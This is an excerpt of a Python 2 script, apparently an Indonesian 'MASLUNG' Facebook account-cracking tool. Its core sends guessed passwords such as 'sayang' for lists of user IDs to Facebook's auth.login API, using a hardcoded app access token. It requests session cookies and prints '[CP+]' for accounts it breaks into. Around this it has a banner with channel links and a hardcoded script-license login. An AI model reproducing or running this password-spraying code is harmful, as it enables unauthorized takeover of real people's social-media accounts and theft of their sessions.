...
logo = """  
\033[32;1m=>(+_+) WELCOME TO MASLUNG HECKEL.
\033[0;1m
\033[0;1m\033[33;1m* \033[34;1mGithub  \033[1;93m: \033[0;1mhttps:github.com/irulrul  \033[1;93m                   
\033[0;1m\033[33;1m* \033[34;1mYT  \033[1;93m    : \033[0;1m\033[4mhttps://www.youtube.com/channel/UCsKgUfkSEwpI4Tc3_SJSEsA\033[0m \033[1;93m                  
\033[0;1m\033[33;1m* \033[34;1mWhtsp \033[1;93m : \033[0;1m\033[4m085735355530\033[0m \033[1;93m       
\033[0;1m
"""
...
def siapa():
	...
	if nama =="":
		...
		os.system('clear')
		jalan("\033[1;97mHaloo.. \033[1;92m" +nama+ "\n\033[1;97mJangan lupa Subscribe dan Share Channel MAS LUNG !!")
		time.sleep(1)
		loginSC()
...
def loginSC():
	os.system('clear')
	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu Lae,kalau gak tau Lisensinya,silahkan Simak Lisensinya di Youtube yang akan di Alihkan Otomatis\n"
	...
	if username =="mas" and password =="lung":
...
def pilih_super():
	...
	print
	print('\x1b[1;96m[!] \x1b[0;1mLoading Please Wait')
	print 42*"\033[1;96m="
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											if 'access_token' in q:
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													pass6 = 'sayang'
													data =
urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[33;1m[CP+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
